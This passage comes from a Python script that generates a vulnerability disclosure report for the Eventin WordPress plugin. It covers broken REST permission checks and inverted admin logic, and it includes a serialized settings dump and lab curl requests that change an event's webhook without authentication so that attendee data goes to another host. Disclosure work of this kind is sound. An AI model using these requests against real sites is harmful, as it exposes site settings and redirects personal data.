        "a:39:{s:24:\"etn_does_demo_data_exits\";b:1;s:7:\"_locale\";s:4:\"user\";s:10:\"wc_enabled\";b:0;s:14:\"payment_method\";s:0:\"\";s:14:\"plugin_version\";s:6:\"4.0.51\";s:7:\"modules\";b:0;s:18:\"zoom_authorize_url\";s:125:\"https://zoom.us/oauth/authorize?response_type=code&redirect_uri=http://localhost:8080/eventin-integration/zoom-auth&client_id\";s:18:\"event_url_editable\";b:0;s:5:\"email\";a:5:{i:0;b:0;s:14:\"purchase_email\";a:5:{s:4:\"from\";s:28:\"marouanefreelance1@gmail.com\";s:7:\"subject\";s:12:\"Event Ticket\";s:4:\"body\";s:69:\"You have purchased ticket(s). Attendee ticket details are as follows.\";s:13:\"send_to_admin\";b:1;s:23:\"send_email_to_attendees\";b:1;}s:17:\"certificate_email\";a:4:{s:4:\"from\";s:28:\"marouanefreelance1@gmail.com\";s:7:\"subject\";s:17:\"Event Certificate\";s:4:\"body\";s:191:\"<p>Congratulations for successfully attending/completing the event '<span>{%event_title%}</span>'. Your certificate is ready! Click on the link provided below to get the PDF certificate. </p>\";s:13:\"send_to_admin\";b:1;}s:9:\"rsv_email\";a:5:{s:4:\"from\";s:28:\"marouanefreelance1@gmail.com\";s:13:\"response_type\";s:5:\"going\";s:7:\"subject\";s:12:\"RSVP request\";s:4:\"body\";s:29:\"We received your RSVP request\";s:13:\"send_to_admin\";b:1;}s:14:\"reminder_email\";a:4:{s:4:\"from\";s:28:\"marouanefreelance1@gmail.com\";s:7:\"subject\";s:14:\"Reminder email\";s:4:\"body\";s:219:\"Just sending you a quick reminder about our retailer meet-up you've registered to attend in two days time. If you've misplaced the Invitation that contained all the details. don't worry. Cve added them rn below for you.\";s:13:\"send_to_admin\";b:1;}}s:29:\"etn_settings_country_currency\";s:3:\"USD\";s:17:\"decimal_separator\";s:9:\"comma_dot\";s:18:\"thousand_separator\";s:1:\",\";s:8:\"decimals\";i:0;s:12:\"price_format\";s:8:\"%1$s%2$s\";s:17:\"currency_position\";s:4:\"left\";s:20:\"wc_order_status_list\";a:0:{}s:17:\"wc_order_statuses\";a:2:{i:0;s:9:\"completed\";i:1;s:10:\"processing\";}s:23:\"show_ticket_expiry_date\";b:0;s:20:\"add_to_cart_redirect\";s:8:\"checkout\";s:24:\"order_thank_you_redirect\";s:12:\"woo_thankyou\";s:21:\"enable_purchase_email\";s:2:\"on\";s:21:\"ticket_purchase_timer\";i:10;s:28:\"ticket_purchase_timer_enable\";s:3:\"off\";s:12:\"extra_fields\";a:0:{}s:14:\"zoom_connected\";b:0;s:23:\"etn_include_from_search\";s:2:\"on\";s:27:\"archive_event_sorting_order\";s:3:\"ASC\";s:17:\"etn_primary_color\";s:0:\"\";s:21:\"attendee_registration\";s:0:\"\";s:12:\"etn_zoom_api\";N;s:18:\"etn_groundhogg_api\";N;s:17:\"etn_googlemap_api\";N;s:10:\"etn_ai_api\";N;s:14:\"currencySymbol\";s:1:\"$\";s:15:\"events_per_page\";i:1;s:11:\"date_format\";s:0:\"\";s:11:\"time_format\";s:0:\"\";s:19:\"etn_secondary_color\";s:0:\"\";s:12:\"sell_tickets\";s:0:\"\";}"
    )

    add_h("Root cause (source code)", level=2)
    doc.add_paragraph("1) REST permission callback always returns true").runs[0].bold = True
    doc.add_paragraph("File: base/api-handler.php — permision_check() returns true, exposing v1 actions at the router level.")
    doc.add_paragraph("2) Server-side nonce injection for settings").runs[0].bold = True
    doc.add_paragraph("File: base/api-handler.php — callback() sets X-WP-Nonce to wp_create_nonce('wp_rest') when action == settings.")
    doc.add_paragraph("3) Inverted authorization logic in settings handler").runs[0].bold = True
    doc.add_paragraph("File: core/event/api.php — get_settings() and post_settings() allow when user is NOT admin and does NOT have manage_options.")

    add_h("Issue 2: Unauthenticated Webhook Configuration Modification (REST)", level=1)
    doc.add_paragraph("Affected endpoint:", style=None).runs[0].bold = True
    doc.add_paragraph("POST /index.php?rest_route=/eventin/v1/event/webhook")
    doc.add_paragraph("Storage:", style=None).runs[0].bold = True
    doc.add_paragraph("Post meta: meta_key = fluent_crm_webhook (per event_id)")

    add_h("Evidence (local lab)", level=2)
    doc.add_paragraph("A) OPTIONS response indicates endpoint is reachable").runs[0].bold = True
    add_code_block(
        "curl -i -X OPTIONS \\\n"
        "  \"http://localhost:8080/index.php?rest_route=/eventin/v1/event/webhook\"\n\n"
        "HTTP/1.1 200 OK\n"
        "Date: Tue, 30 Dec 2025 23:14:19 GMT\n"
        "Server: Apache/2.4.65 (Debian)\n"
        "X-Powered-By: PHP/8.3.29\n"
        "Allow: GET, POST, PUT, PATCH, DELETE\n"
        "Content-Length: 156\n"
        "Content-Type: application/json; charset=UTF-8\n\n"
        "{\"namespace\":\"eventin/v1/event\",\"methods\":[\"GET\",\"POST\",\"PUT\",\"PATCH\",\"DELETE\"],\"endpoints\":[{\"methods\":[\"GET\",\"POST\",\"PUT\",\"PATCH\",\"DELETE\"],\"args\":[]}]}"
    )

    doc.add_paragraph("B) POST request (unauthenticated) and observed 200 OK").runs[0].bold = True
    add_code_block(
        "curl -i -X POST \\\n"
        "  \"http://localhost:8080/index.php?rest_route=/eventin/v1/event/webhook\" \\\n"
        "  -H \"Content-Type: application/json\" \\\n"
        "  -d '{\"event_id\":8,\"fluent_crm_webhook\":\"https://example.test/webhook\"}'\n\n"
        "HTTP/1.1 200 OK\n"
        "Date: Tue, 30 Dec 2025 23:19:15 GMT\n"
        "Server: Apache/2.4.65 (Debian)\n"
        "X-Powered-By: PHP/8.3.29\n"
        "Allow: GET, POST, PUT, PATCH, DELETE\n"
        "Content-Length: 0\n"
        "Content-Type: application/json; charset=UTF-8"
    )

    doc.add_paragraph("C) Database confirmation").runs[0].bold = True
    add_code_block(
        "SELECT COUNT(*)\nFROM wp_postmeta\nWHERE post_id = 8\n  AND meta_key = 'fluent_crm_webhook';\n\n"
        "Observed: COUNT = 1"
    )

    add_h("Why this matters (data egress path)", level=2)
    doc.add_paragraph(
        "Eventin’s FluentCRM webhook integration reads fluent_crm_webhook from post meta and performs an outbound HTTP POST when enabled. "
        "If an attacker can change fluent_crm_webhook, they may redirect purchaser/attendee data to attacker-controlled endpoints."
    )
    add_code_block(
        "core/Integrations/Webhook/FluentCRM.php\n"
        "- reads: get_post_meta($event_id, 'fluent_crm_webhook', true)\n"
        "- sends: wp_remote_post($fluentcrm_webhook, ['body' => $body])"
    )

    add_h("Recommended remediation (both issues)", level=1)
    doc.add_paragraph("Enforce strict REST permissions at the route level:").runs[0].bold = True
    doc.add_paragraph("- Replace permision_check() => true with capability checks for sensitive actions (settings/webhook).")
    doc.add_paragraph("- Do not inject REST nonces server-side for unauthenticated requests.")
    doc.add_paragraph("- Fix inverted authorization logic in get_settings()/post_settings().")
    doc.add_paragraph("- Return 401/403 errors for unauthenticated callers.")

    doc.add_paragraph()
    doc.add_paragraph("Source code references (tested plugin source snapshot):").runs[0].bold = True
    doc.add_paragraph("- base/api-handler.php: nonce injection for settings (lines 51–55) and router permission bypass (lines 70–72).")
    doc.add_paragraph("- core/event/api.php: get_settings() (lines 192–226) and post_settings() (lines 233–266).")

    add_h("Suggested CVSS v3.1 (indicative)", level=1)
    doc.add_paragraph("Issue 1 (settings): AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L")
    doc.add_paragraph("Issue 2 (webhook): AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (depends on site configuration)")

    add_h("Timeline (template)", level=1)
    doc.add_paragraph(f"{REPORT_DATE}: Issue discovered and validated in local environment.")
    doc.add_paragraph("YYYY-MM-DD: Report submitted to vendor.")
    doc.add_paragraph("YYYY-MM-DD: Vendor acknowledgment.")
    doc.add_paragraph("YYYY-MM-DD: Patch released.")
    doc.add_paragraph("YYYY-MM-DD: Public disclosure / CVE request (if applicable).")

    doc.save(str(DOCX_PATH))


def main() -> None:
    write_text_outputs()
    build_docx()


if __name__ == "__main__":
    main()

